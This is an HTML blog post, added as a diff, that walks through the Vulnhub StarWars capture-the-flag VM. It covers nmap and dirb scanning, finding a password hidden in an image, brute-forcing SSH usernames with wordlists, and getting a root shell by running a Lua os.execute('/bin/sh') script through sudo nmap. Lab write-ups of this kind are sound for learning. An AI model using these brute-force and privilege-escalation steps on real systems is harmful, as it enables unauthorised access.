@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
+    <style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: StarWars CTF
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Sept 6, 2020
+            </h2>
+        </div>
+    </div>
+</section>
+<section class="container mt-2">
+<div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">StarWars CTF</a></li>
+        </ul>
+      </nav>
+<h3>Scanning:</h3>
+<pre><code><span>root@kali:~#​ nmap​ -PS 192.168.57.15
+Starting Nmap 7.80 ( https://​ nmap​ .org ) at 2020-09-06 17:16 EDT
+Nmap scan report ​ for​ 192.168.57.15
+Host ​ is​ ​ up​ (0.00053s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp ​ open​ ssh
+80/tcp ​ open​ http
+</span></code></pre>
+<h4>Checking out the Web Server:</h4>
+<img src="images/20/20-001.jpg" style="width: 80%;">
+<h4>Checking the page source:</h4>
+<img src="images/20/20-002.jpg" style="width: 80%;">
+<h4>Decoding from base64:</h4>
+<img src="images/20/20-003.jpg" style="width: 60%;">
+<h4>Decoding from Binary:</h4>
+<img src="images/20/20-004.jpg" style="width: 60%;">
+<h3>Web: Enumeration:</h3>
+<pre><code><span>root@kali:~#​ ​dirb​ http://192.168.57.15
+
+GENERATED​ WORDS: ​ 4612
+-​ ---​ ​ Scanning​ URL: http://192.168.57.15/ ​ ----
++​ http://192.168.57.15/admin ​ (CODE:200|SIZE:3753)
+==&gt;​ DIRECTORY: http://192.168.57.15/images/
++​ http://192.168.57.15/index.html ​ (CODE:200|SIZE:548)
+==&gt;​ DIRECTORY: http://192.168.57.15/javascript/
+==&gt;​ DIRECTORY: http://192.168.57.15/manual/
++​ http://192.168.57.15/robots.txt ​ (CODE:200|SIZE:105)
++​ http://192.168.57.15/server-status ​ (CODE:403|SIZE:278)
++​ http://192.168.57.15/wordpress ​ (CODE:200|SIZE:54)
+</span></code></pre>
+<h3>Checking wordpress:</h3>
+<img src="images/20/20-005.jpg" style="width: 40%;">
+<h3>Checking out admin:</h3>
+<img src="images/20/20-006.jpg" style="width: 60%;">
+<p>There is nothing there, the login does not actually go anywhere:</p>
+<img src="images/20/20-007.jpg" style="width: 40%;">
+<h4>Checking robots.txt:</h4>
+<img src="images/20/20-008.jpg" style="width: 40%;">
+<h5>Checking out r2d2:</h5>
+<img src="images/20/20-009.jpg" style="width: 60%;">
+<h5>Creating a wordlist from this page, there are several star wars words on the page (tatooine, obi wan, etc):</h5>
+<img src="images/20/20-010.png" style="width: 60%;">
+<h5>Downloading the two images (2 yodas seen on home page):</h5>
+You can see they are vastly different sizes, there might be something hidden in one.
+<img src="images/20/20-012.jpg" style="width: 60%;">
+<h3>Stego:</h3>
+<p>Running stegoveritas on yoda.png:</p>
+<img src="images/20/20-013.png" style="width: 60%;">
+<p>Result:</p>
+<pre><code><span>root​@kali​:~/Downloads/results/keepers​# cat 1599426719.9636476
+the real password is babyYoda123
+</span></code></pre>
+<h3>SSH Login:</h3>
+<p>Finding the username to go with the password:</p>
+<h4>Trying the cewl wordlist:</h4>
+<img src="images/20/20-015.png" style="width: 60%;">
+<h4>Using a star wars wordlist:</h4>
+<img src="images/20/20-017.png" style="width: 60%;">
+<h3>Login to SSH:</h3>
+<img src="images/20/20-019.png" style="width: 60%;">
+<img src="images/20/20-021.png" style="width: 60%;">
+<p>Oops I missed this:</p>
+<img src="images/20/20-023.png" style="width: 60%;">
+<p>Trying the cewl wordlist with skywalker:</p>
+<img src="images/20/20-025.png" style="width: 60%;">
+<h3>Privilege Escalation:</h3>
+<h4>Logging in as skywalker:</h4>
+<img src="images/20/20-027.png" style="width: 60%;">
+<br>
+<p>This file suggests Darth must have a cronjob running:</p>
+<pre><code><span>
+skywalker​@starwars​:~​$ ​cat .secrets/note.txt
+Darth must take up the job of being a good father
+skywalker​@starwars​:~$ ​id -a
+uid=​1001(skywalker) gid=​1001​(skywalker) groups=​1001​(skywalker),​2000​(anakin)
+</span></code></pre>
+<p>This must be the script run for the job, it must run every minute.</p>
+<pre><code><span>
+skywalker​@starwars​:/home/Darth/​.secrets​$ ​cat evil.py
+# Let the fear flow through you every single minute
+fear = ​ 1
+anger = fear
+hate = anger
+suffering = hate
+</span></code></pre>
+<p>I looked for the job couldn’t find it.</p>
+<h3>“Cheating” at Priv Esc:</h3>
+<p>Used this to get the password for Darth. (The creator of this box forgot to clear the command history)
+Combine these into luke12clone50, and log in to Darth.</p>
+<img src="images/20/20-029.png" style="width: 60%;">
+<img src="images/20/20-031.png" style="width: 60%;">
+<h4>Checking crontab:</h4>
+<img src="images/20/20-035.png" style="width: 60%;">
+<p>Oops I really messed up there.</p>
+<h4>Use nmap to get a root shell:</h4>
+<img src="images/20/20-033.png" style="width: 60%;">
+<p>Use mktemp to create a temporary file that can be executed with the nmap script param</p>
+<pre><code><span>Darth​@starwars​:/home/skywalker​$ TF=​$(mktemp)
+Darth​@starwars​:/home/skywalker​$ echo ​ 'os.execute(&quot;/bin/sh&quot;)'​ &gt; ​ $TF
+Darth​@starwars​:/home/skywalker​$ sudo nmap --script=​ $TF
+</span></code></pre>
+<img src="images/20/20-037.png" style="width: 60%;">
+<h5>Root Flag:</h5>
+<img src="images/20/20-039.png" style="width: 60%;">
+<p>FIN.</p>
+</div>
+</section>
+<footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
